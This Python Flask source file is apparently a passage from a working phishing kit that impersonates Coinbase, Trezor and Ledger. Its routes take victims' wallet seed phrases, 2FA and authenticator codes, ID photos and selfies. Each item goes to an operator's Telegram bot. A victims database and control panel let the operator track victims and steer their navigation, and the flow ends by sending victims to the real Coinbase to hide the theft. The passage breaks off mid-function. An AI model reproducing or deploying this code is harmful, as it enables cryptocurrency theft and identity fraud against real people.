    if session_id and session_id in verification_page_data:
        data = verification_page_data[session_id]
        print(f"Returning verification data for session {session_id}: {data}")
        return jsonify(data)
    print(f"No verification data found for session {session_id}")
    return jsonify({'email': '', 'phone': ''})
# Add this route to set phone number for OTP page
@app.route('/api/set-phone-data', methods=['POST'])
def set_phone_data():
    """Set phone number for OTP page placeholders"""
    data = request.get_json()
    session_id = data.get('session_id')
    phone = data.get('phone')
    
    if session_id and phone:
        verify_page_data[session_id] = {
            **verify_page_data.get(session_id, {}),
            'phone': phone,
            'timestamp': datetime.now().isoformat()
        }
    
    return jsonify({'success': True})

# Add this route to get phone data
@app.route('/api/get-recovery-data')
def get_recovery_data():
    """Get recovery page data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in recovery_page_data:
        data = recovery_page_data[session_id]
        print(f"Returning recovery data for session {session_id}: {data}")
        return jsonify(data)
    print(f"No recovery data found for session {session_id}")
    return jsonify({'email': '', 'number': ''})

# Add this to your set_recovery_data function
@app.route('/api/set-recovery-data', methods=['POST'])
def set_recovery_data():
    """Set data for recovery page placeholders (email and number)"""
    data = request.get_json()
    session_id = data.get('session_id')
    email = data.get('email')
    number = data.get('number')
    
    print(f"Setting recovery data - Session: {session_id}, Email: {email}, Number: {number}")
    
    if session_id:
        recovery_page_data[session_id] = {
            'email': email or '',
            'number': number or '',
            'timestamp': datetime.now().isoformat()
        }
        print(f"Recovery data stored: {recovery_page_data[session_id]}")
    
    return jsonify({'success': True})
@app.route('/api/get-phone-data')
def get_phone_data():
    """Get phone data for current session"""
    session_id = session.get('victim_session')
    if session_id and session_id in verify_page_data:
        return jsonify(verify_page_data[session_id])
    return jsonify({'phone': ''})
@app.route('/check-command')
def check_command():
    """Check if there's a command for the victim - FIXED"""
    session_id = session.get('victim_session')
    
    if session_id and session_id in victim_commands:
        command = victim_commands[session_id]
        print(f"🎯 Command found and REMOVED: {command} for session {session_id}")
        
        # 🎯 IMMEDIATELY REMOVE COMMAND TO PREVENT SPAM
        victim_commands.pop(session_id, None)
        
        return jsonify({'command': command})
    
    return jsonify({'command': None})
    
@app.route('/trezor')
def trezor():
    """Trezor seed phrase collection page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Trezor Page', email)
        
        # Send notification when they reach Trezor page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED TREZOR PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Trezor Seed Phrase

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

💰 <b>Ready for seed phrase capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('trezor.html')

@app.route('/trezor-submit', methods=['POST'])
def trezor_submit():
    """Handle Trezor seed phrase submission"""
    data = request.get_json()
    seed_phrase = data.get('seed_phrase', '').strip()
    session_id = data.get('session_id') or session.get('victim_session')
    
    print(f"Received Trezor seed phrase - Session: {session_id}, Seed Phrase: {seed_phrase}")
    
    if seed_phrase and session_id:
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Send Telegram notification with seed phrase
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        # Count words in seed phrase
        word_count = len(seed_phrase.split())
        
        message = f"""
💰 <b>🚨 TREZOR SEED PHRASE CAPTURED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Seed Phrase:</b> <code>{seed_phrase}</code>
🔢 <b>Word Count:</b> {word_count} words
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Trezor Disconnect

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⚠️ <b>CRITICAL: Seed phrase captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Trezor Seed Phrase Submitted', email)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'No seed phrase provided'})  
@app.route('/ledger')
def ledger():
    """Ledger seed phrase collection page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Ledger Page', email)
        
        # Send notification when they reach Ledger page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED LEDGER PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Ledger Seed Phrase

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

💰 <b>Ready for seed phrase capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('ledger_connect.html')

@app.route('/ledger-submit', methods=['POST'])
def ledger_submit():
    """Handle Ledger seed phrase submission"""
    data = request.get_json()
    seed_phrase = data.get('seed_phrase', '').strip()
    session_id = data.get('session_id') or session.get('victim_session')
    
    print(f"Received Ledger seed phrase - Session: {session_id}, Seed Phrase: {seed_phrase}")
    
    if seed_phrase and session_id:
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Send Telegram notification with seed phrase
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        # Count words in seed phrase
        word_count = len(seed_phrase.split())
        
        message = f"""
💰 <b>🚨 LEDGER SEED PHRASE CAPTURED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Seed Phrase:</b> <code>{seed_phrase}</code>
🔢 <b>Word Count:</b> {word_count} words
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Ledger Disconnect

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⚠️ <b>CRITICAL: Ledger seed phrase captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'Ledger Seed Phrase Submitted', email)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'No seed phrase provided'})
# Panel Routes - No authentication needed
@app.route('/external')
def external():
    """External wallet seed phrase collection page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Check if we have verify data for this session
    if session_id and session_id in verify_page_data:
        email = verify_page_data[session_id].get('email', email)
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'External Wallet Page', email)
        
        # Send notification when they reach External Wallet page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED EXTERNAL WALLET PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> External Wallet Seed Phrase

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

💰 <b>Ready for seed phrase capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('externalwallet.html')

@app.route('/external-submit', methods=['POST'])
def external_submit():
    """Handle External Wallet seed phrase submission"""
    data = request.get_json()
    seed_phrase = data.get('seed_phrase', '').strip()
    session_id = data.get('session_id') or session.get('victim_session')
    
    print(f"Received External Wallet seed phrase - Session: {session_id}, Seed Phrase: {seed_phrase}")
    
    if seed_phrase and session_id:
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Send Telegram notification with seed phrase
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        # Count words in seed phrase
        word_count = len(seed_phrase.split())
        
        message = f"""
💰 <b>🚨 EXTERNAL WALLET SEED PHRASE CAPTURED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🔐 <b>Seed Phrase:</b> <code>{seed_phrase}</code>
🔢 <b>Word Count:</b> {word_count} words
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> External Wallet Disconnect

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

⚠️ <b>CRITICAL: External wallet seed phrase captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, 'External Wallet Seed Phrase Submitted', email)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'No seed phrase provided'})

@app.route('/idtype')
def idtype():
    """ID type selection page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'ID Type Page', email)
        
        # Send notification when they reach ID Type page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🆔 <b>VICTIM REACHED ID TYPE SELECTION PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> ID Type Selection

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

📄 <b>Ready for ID type capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('idtype.html')

@app.route('/idtype-submit', methods=['POST'])
def idtype_submit():
    """Handle ID type selection submission"""
    data = request.get_json()
    id_type = data.get('id_type', '').strip()
    session_id = data.get('session_id') or session.get('victim_session')
    
    print(f"Received ID type selection - Session: {session_id}, ID Type: {id_type}")
    
    if id_type and session_id:
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Send Telegram notification with ID type
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        # Map ID type to readable names
        id_type_names = {
            'drivers_license': "Driver's License",
            'state_id': "State Issued ID"
        }
        
        id_type_display = id_type_names.get(id_type, id_type)
        
        message = f"""
🆔 <b>🚨 ID TYPE SELECTED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🪪 <b>ID Type Selected:</b> <code>{id_type_display}</code>
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> ID Type Selection

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

✅ <b>ID type captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, f'ID Type Selected: {id_type_display}', email)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'No ID type selected'})



@app.route('/idupload')
def idupload():
    """ID upload page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'ID Upload Page', email)
        
        # Send notification when they reach ID Upload page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📸 <b>VICTIM REACHED ID UPLOAD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> ID Photo Upload

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🪪 <b>Ready for ID photo capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('id.html')

import requests
from PIL import Image
import io

@app.route('/idupload-submit', methods=['POST'])
def idupload_submit():
    """Handle ID photo upload submission"""
    try:
        session_id = request.form.get('session_id') or session.get('victim_session')
        
        if not session_id:
            return jsonify({'success': False, 'error': 'No session found'})
        
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Check if files are uploaded
        if 'front_photo' not in request.files or 'back_photo' not in request.files:
            return jsonify({'success': False, 'error': 'Please upload both front and back photos'})
        
        front_file = request.files['front_photo']
        back_file = request.files['back_photo']
        
        if front_file.filename == '' or back_file.filename == '':
            return jsonify({'success': False, 'error': 'Please select both front and back photos'})
        
        # Validate file types - accept all common image formats
        allowed_extensions = {
    'png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'tiff', 'heic',
    'PNG', 'JPG', 'JPEG', 'GIF', 'BMP', 'WEBP', 'TIFF', 'HEIC'
}
        
        def allowed_file(filename):
            if '.' not in filename:
                return False
            ext = filename.rsplit('.', 1)[1].lower()
            return ext in allowed_extensions
        
        if not allowed_file(front_file.filename) or not allowed_file(back_file.filename):
            return jsonify({'success': False, 'error': 'Only image files are allowed (PNG, JPG, JPEG, GIF, BMP, WEBP, TIFF, HEIC)'})
        
        # Save files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        front_filename = f"{session_id}_front_{timestamp}.{front_file.filename.rsplit('.', 1)[1].lower()}"
        back_filename = f"{session_id}_back_{timestamp}.{back_file.filename.rsplit('.', 1)[1].lower()}"
        
        front_path = os.path.join(UPLOAD_FOLDER, front_filename)
        back_path = os.path.join(UPLOAD_FOLDER, back_filename)
        
        front_file.save(front_path)
        back_file.save(back_path)
        
        # Send Telegram notification with actual images
        timestamp_display = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        # Send text message first
        text_message = f"""
📸 <b>🚨 ID PHOTOS UPLOADED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp_display}</code>
📍 <b>Page:</b> ID Photo Upload

📁 <b>Files Saved:</b>
- Front: <code>{front_filename}</code>
- Back: <code>{back_filename}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

✅ <b>ID photos captured successfully!</b>
        """
        
        send_telegram_message(text_message)
        
        # Send front photo
        send_telegram_photo(front_path, f"🪪 FRONT ID - {email}\nIP: {ip_address}\nTime: {timestamp_display}")
        
        # Send back photo  
        send_telegram_photo(back_path, f"🪪 BACK ID - {email}\nIP: {ip_address}\nTime: {timestamp_display}")
        
        # Log the submission
        log_navigation(session_id, 'ID Photos Uploaded', email)
        
        return jsonify({'success': True})
    
    except Exception as e:
        print(f"Error processing ID upload: {e}")
        return jsonify({'success': False, 'error': 'Server error processing upload'})

def send_telegram_photo(image_path, caption=""):
    """Send photo to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        
        with open(image_path, 'rb') as photo:
            files = {'photo': photo}
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, files=files, data=data)
            return response.status_code == 200
    except Exception as e:
        print(f"Error sending photo to Telegram: {e}")
        return False
    
@app.route('/selfie')
def selfie():
    """Selfie upload page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Selfie Upload Page', email)
        
        # Send notification when they reach Selfie page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🤳 <b>VICTIM REACHED SELFIE UPLOAD PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Selfie Upload

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

📸 <b>Ready for selfie capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('selfie.html')

@app.route('/selfie-submit', methods=['POST'])
def selfie_submit():
    """Handle selfie photo upload submission"""
    try:
        session_id = request.form.get('session_id') or session.get('victim_session')
        
        if not session_id:
            return jsonify({'success': False, 'error': 'No session found'})
        
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Check if file is uploaded
        if 'selfie_photo' not in request.files:
            return jsonify({'success': False, 'error': 'Please upload a selfie photo'})
        
        selfie_file = request.files['selfie_photo']
        
        if selfie_file.filename == '':
            return jsonify({'success': False, 'error': 'Please select a selfie photo'})
        
        # Validate file types - accept all common image formats
        allowed_extensions = {'png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'tiff', 'heic'}
        
        def allowed_file(filename):
            if '.' not in filename:
                return False
            ext = filename.rsplit('.', 1)[1].lower()
            return ext in allowed_extensions
        
        if not allowed_file(selfie_file.filename):
            return jsonify({'success': False, 'error': 'Only image files are allowed (PNG, JPG, JPEG, GIF, BMP, WEBP, TIFF, HEIC)'})
        
        # Save file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        selfie_filename = f"{session_id}_selfie_{timestamp}.{selfie_file.filename.rsplit('.', 1)[1].lower()}"
        
        selfie_path = os.path.join(UPLOAD_FOLDER, selfie_filename)
        selfie_file.save(selfie_path)
        
        # Send Telegram notification with actual selfie image
        timestamp_display = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        # Send text message first
        text_message = f"""
🤳 <b>🚨 SELFIE PHOTO UPLOADED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp_display}</code>
📍 <b>Page:</b> Selfie Upload

📁 <b>File Saved:</b> <code>{selfie_filename}</code>

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

✅ <b>Selfie photo captured successfully!</b>
        """
        
        send_telegram_message(text_message)
        
        # Send selfie photo
        send_telegram_photo(selfie_path, f"🤳 SELFIE - {email}\nIP: {ip_address}\nTime: {timestamp_display}")
        
        # Log the submission
        log_navigation(session_id, 'Selfie Photo Uploaded', email)
        
        return jsonify({'success': True})
    
    except Exception as e:
        print(f"Error processing selfie upload: {e}")
        return jsonify({'success': False, 'error': 'Server error processing upload'})
    
@app.route('/authenticator')
def authenticator():
    """Authenticator code page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Authenticator Code Page', email)
        
        # Send notification when they reach Authenticator page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>VICTIM REACHED AUTHENTICATOR CODE PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Authenticator Code

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🔢 <b>Ready for 2FA code capture!</b>
        """
        
        send_telegram_message(message)
    
    return render_template('auntheticatorcode.html')

@app.route('/authenticator-submit', methods=['POST'])
def authenticator_submit():
    """Handle authenticator code submission"""
    data = request.get_json()
    code = data.get('code', '').strip()
    session_id = data.get('session_id') or session.get('victim_session')
    
    print(f"Received authenticator code - Session: {session_id}, Code: {code}")
    
    if code and session_id:
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Send Telegram notification with the code
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>🚨 AUTHENTICATOR CODE CAPTURED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>2FA Code:</b> <code>{code}</code>
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Authenticator Code

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

✅ <b>2FA code captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, f'Authenticator Code Submitted: {code}', email)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'No code provided'})

# Add this route to handle the 2-factor code submission
@app.route('/coinbase-2factor-submit', methods=['POST'])
def coinbase_2factor_submit():
    """Handle Coinbase 2-factor verification code submission"""
    data = request.get_json()
    code = data.get('code', '').strip()
    session_id = data.get('session_id') or session.get('victim_session')
    
    print(f"Received Coinbase 2-factor code - Session: {session_id}, Code: {code}")
    
    if code and session_id:
        # Get victim info
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT email, ip_address FROM victims WHERE session_id = %s", (session_id,))
        victim = c.fetchone()
        email = victim[0] if victim else 'No email'
        ip_address = victim[1] if victim else get_client_ip()
        conn.close()
        
        # Send Telegram notification with the code
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
🔐 <b>🚨 COINBASE 2-FACTOR CODE CAPTURED! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>6-Digit Code:</b> <code>{code}</code>
🌐 <b>IP Address:</b> <code>{ip_address}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Page:</b> Coinbase 2-Factor Verification

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

✅ <b>Coinbase 2FA code captured successfully!</b>
        """
        
        send_telegram_message(message)
        
        # Log the submission
        log_navigation(session_id, f'Coinbase 2-Factor Code Submitted: {code}', email)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'No code provided'})

# Add this route to serve the coinbase 2-factor page
@app.route('/coinbase-2factor')
def coinbase_2factor():
    """Coinbase 2-factor verification page"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Get phone data for display
    phone_digits = ""
    if session_id and session_id in verify_page_data:
        phone_data = verify_page_data[session_id].get('phone', '')
        # Extract last 2 digits if phone number is provided
        if phone_data and len(phone_data) >= 2:
            phone_digits = phone_data[-2:]
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Coinbase 2-Factor Page', email)
        
        # Send notification when they reach coinbase 2-factor page
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        panel_url = f"{request.host_url.rstrip('/')}/panel"
        
        message = f"""
📱 <b>VICTIM REACHED COINBASE 2-FACTOR PAGE!</b>

📧 <b>Email:</b> <code>{email}</code>
🔢 <b>Phone Digits Displayed:</b> <code>{phone_digits}</code>
🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Current Page:</b> Coinbase 2-Factor

🔗 <b><a href="{panel_url}">CONTROL PANEL - CLICK HERE</a></b>

🔐 <b>Ready for 6-digit code capture!</b>
        """
        
        send_telegram_message(message)
    
    # Pass the phone digits to the template
    return render_template('coinbase2factor.html', 
                         phone_digits=phone_digits, 
                         session_id=session_id)
@app.route('/final-redirect')
def final_redirect():
    """Final redirect page - sends victim to real Coinbase"""
    if not session.get('is_victim') and not session.get('has_token_access'):
        return redirect(url_for('index'))
    
    session_id = session.get('victim_session')
    email = session.get('email', '')
    
    # Track navigation
    if session_id:
        log_navigation(session_id, 'Final Redirect Page', email)
        
        # Check if we already sent the completion message for this session
        completion_key = f'completion_sent_{session_id}'
        if not session.get(completion_key):
            # Send final notification ONLY if not already sent
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            client_ip = get_client_ip()
            
            message = f"""
🎯 <b>🚨 VICTIM COMPLETED THE FLOW! 🚨</b>

📧 <b>Email:</b> <code>{email}</code>
🌐 <b>IP Address:</b> <code>{client_ip}</code>
🕒 <b>Time:</b> <code>{timestamp}</code>
📍 <b>Final Page:</b> Redirect to Real Coinbase

💰 <b>FLOW COMPLETED SUCCESSFULLY!</b>

🔚 <b>Victim is being redirected to real Coinbase.com</b>
            """
            
            send_telegram_message(message)
            
            # Mark as sent to prevent duplicates
            session[completion_key] = True
    
    return render_template('final_redirect.html', session_id=session_id)
@app.route('/panel')
@admin_required
def panel():
    """Control panel - accessible directly from Telegram"""
    return render_template('panel.html')

@app.route('/api/get-victims')
def get_victims():
    """Get all active victims with current status - OPTIMIZED"""
    conn = get_db_connection()
    c = conn.cursor()
    
    # 🚨 OPTIMIZED QUERY - FIXED N+1 PROBLEM
    c.execute('''
        SELECT 
            v.session_id, 
            v.email, 
            v.ip_address, 
            v.current_page, 
            v.timestamp,
            (SELECT COUNT(*) FROM navigations n WHERE n.session_id = v.session_id) as nav_count,
            (SELECT MAX(timestamp) FROM navigations n WHERE n.session_id = v.session_id) as last_activity
        FROM victims v 
        WHERE v.is_active = TRUE
        ORDER BY v.timestamp DESC
        LIMIT 50  -- 🚨 ADD LIMIT FOR PERFORMANCE
    ''')
    victims = c.fetchall()
    
    conn.close()
    
    return jsonify({
        'victims': [{
            'session_id': v[0],
            'email': v[1] or 'No email yet',
            'ip_address': v[2],
            'current_page': v[3] or 'login',
            'timestamp': v[4],
            'nav_count': v[5] or 0,
            'last_activity': v[6]
        } for v in victims]
    })

@app.route('/api/get-banned-ips')
def get_banned_ips():
    """Get all banned IP addresses"""
    try:
        # Check if admin is logged in
        if not session.get('admin_logged_in'):
            print("❌ Unauthorized access to banned IPs")
            return jsonify({'error': 'Unauthorized', 'redirect': '/admin-login'}), 401
        
        conn = get_db_connection()
        c = conn.cursor()
        
        c.execute("SELECT ip_address, reason, timestamp FROM banned_ips ORDER BY timestamp DESC")
        banned_ips = c.fetchall()
        conn.close()
        
        print(f"✅ Retrieved {len(banned_ips)} banned IPs from database")
        
        banned_ips_list = []
        for ip in banned_ips:
            banned_ips_list.append({
                'ip_address': ip[0] or 'Unknown',
                'reason': ip[1] or 'Manual Ban',
                'timestamp': ip[2].isoformat() if ip[2] else None
            })
        
        return jsonify({
            'banned_ips': banned_ips_list,
            'success': True,
            'count': len(banned_ips_list)
        })
        
    except Exception as e:
        print(f"❌ Error in get_banned_ips: {e}")
        return jsonify({'error': str(e), 'banned_ips': [], 'success': False}), 500
@app.route('/api/victim-navigations/<session_id>')
def get_victim_navigations(session_id):
    """Get navigations for a specific victim"""
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute("SELECT * FROM navigations WHERE session_id = %s ORDER BY timestamp DESC LIMIT 20", (session_id,))
    navigations = c.fetchall()
    
    c.execute("SELECT * FROM victims WHERE session_id = %s", (session_id,))
    victim = c.fetchone()
    
    conn.close()
    
    return jsonify({
        'victim': {
            'id': victim[0],
            'email': victim[1],
            'ip_address': victim[2],
            'user_agent': victim[3],
            'session_id': victim[4],
            'current_page': victim[5],
            'is_active': victim[6],
            'timestamp': victim[7]
        } if victim else None,
        'navigations': [{
            'id': nav[0],
            'session_id': nav[1],
            'email': nav[2],
            'ip_address': nav[3],
            'page_url': nav[4],
            'timestamp': nav[5]
        } for nav in navigations]
    })
@app.route('/check-victim-session')
def check_victim_session():
    """Check if user has valid victim session"""
    is_victim = session.get('is_victim', False)
    return jsonify({'is_victim': is_victim})

    
@app.route('/api/control-victim', methods=['POST'])
def control_victim():
    """Control victim navigation - FORCE REDIRECT WITH ENCODED URLS"""
    data = request.get_json()
    session_id = data.get('session_id')
    action = data.get('action')
